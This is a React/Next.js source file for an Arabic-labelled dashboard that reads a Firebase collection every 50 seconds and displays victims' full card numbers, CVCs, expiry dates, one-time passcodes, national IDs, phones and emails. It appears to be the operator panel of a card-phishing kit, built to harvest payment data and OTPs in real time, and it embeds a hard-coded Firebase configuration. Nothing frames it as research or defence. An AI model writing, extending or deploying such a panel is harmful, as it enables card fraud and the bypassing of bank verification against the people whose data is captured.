'use client'

import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Skeleton } from '@/components/skeleton';

import { initializeApp } from "firebase/app"
import { collection, getDocs, getFirestore } from "firebase/firestore"
import { useEffect, useState } from 'react';
import { Button } from '@/components/ui/button';

const firebaseConfig = {
  apiKey: "AIzaSyA9NrjUj3Df-UztH1yv4mH-3uH97q9yxno",
  authDomain: "apospasl.firebaseapp.com",
  databaseURL: "https://apospasl-default-rtdb.firebaseio.com",
  projectId: "apospasl",
  storageBucket: "apospasl.firebasestorage.app",
  messagingSenderId: "362697719748",
  appId: "1:362697719748:web:0ab53764b0fb700d942e91",
  measurementId: "G-3F6Q26EGJ4"
};
type User = {
  id:string,
date:any,
 payment:{
  cardNumber: string
  expiry: string
  cvc: string
 },
 personalInfo:{
  name:string
  id:string
  email:string
  phone:string
 }
 otp:{
  otp:string
 }
}
// Initialize Firebase


export default function Dashboard() {
  const [users, setUsers] = useState<User[]>([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const app = initializeApp(firebaseConfig)
  const db = getFirestore(app)
  const fetchUsers = async () => {
    setLoading(true)
    setError(null)
    try {
      const usersCollection = collection(db, "data")
      const userSnapshot = await getDocs(usersCollection)
      console.log(userSnapshot.docs[0])
      const userList = userSnapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as unknown as User[]
      console.log(userList)
      setUsers(userList)
    } catch (err) {
      setError("Failed to fetch users. Please try again.")
      console.error("Error fetching users:", err)
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
  setInterval(()=>  fetchUsers(),50000)
  }, [])

  return (
    <div className="container mx-auto p-4">
      <Card className="w-full max-w-2xl mx-auto" dir="rtl">
        <CardHeader>
          <CardTitle className="text-2xl font-bold">لوحة البيانات</CardTitle>
        </CardHeader>
        <Button onClick={fetchUsers} className="mt-4">
           تحديث
          </Button>
        <CardContent>
          {loading ? (
            <div className="space-y-2">
              <Skeleton className="h-4 w-full" />
              <Skeleton className="h-4 w-full" />
              <Skeleton className="h-4 w-full" />
            </div>
          ) : error ? (
            <div className="text-red-500">{error}</div>
          ) : (
            <ul className="space-y-2">
              {users.map(user => (
                <li key={user.id} className="bg-secondary p-2 rounded">
                  <p className="font-semibold">{user.date}</p>
                  <p className="font-semibold">{user.personalInfo.name}</p>

                  <p className="text-sm text-muted-foreground">{user.personalInfo.id}</p>
                  <p className="text-sm text-muted-foreground">{user.personalInfo.phone}</p>
                  <p className="text-sm text-muted-foreground">{user.personalInfo.email}</p>
                  <p className="text-sm text-blue-500 ">{user.payment.cardNumber}</p>
                  <p className="text-sm text-blue-500 "><strong className="text-sm text-red-500 ">cvc: </strong>{user.payment.cvc}</p>
                  <p className="text-sm text-blue-500 ">{user.payment.expiry}</p>
                  <p className="text-sm text-blue-500 "><strong className="text-sm text-red-500 ">OTP: </strong>{user.otp.otp}</p>
                </li>
              ))}
            </ul>
          )}
          <Button onClick={fetchUsers} className="mt-4">
           تحديث
          </Button>
        </CardContent>
      </Card>
    </div>
  )
}